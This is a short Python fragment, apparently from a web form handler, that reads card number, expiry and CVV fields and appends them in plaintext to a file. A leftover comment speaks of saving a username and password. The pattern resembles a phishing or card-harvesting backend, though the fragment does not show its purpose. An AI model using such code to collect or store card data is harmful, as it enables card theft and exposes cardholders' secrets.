...
def submit_data():
   ...
   number = data.get('ccnumber')
   expm = data.get('ccexpm')
   expy = data.get("ccexpy")
   csc = data.get("cccsc")


   if number and expm and expy and csc:
       # Open the file in append mode and save the username and password
       with open(data_file, 'a') as file:
           file.write(f"Number: {number}, Expiry date: {expy}/{expm}, CVV: {csc}\n")
